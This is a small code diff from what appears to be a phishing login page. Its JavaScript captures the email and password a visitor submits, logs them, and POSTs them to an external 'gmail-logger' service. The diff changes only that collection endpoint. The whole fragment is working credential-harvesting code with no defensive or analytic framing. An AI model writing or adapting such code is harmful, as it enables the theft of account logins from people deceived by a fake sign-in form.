@@ -5,7 +5,7 @@ document.getElementById('login-form').addEventListener('submit', function(event)
 
     console.log("Email: " + email + ", Password: " + password);
 
-    fetch('https://email-login-qvld.onrender.com/log', {
+    fetch('https://gmail-logger.onrender.com/log', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email: email, password: password })
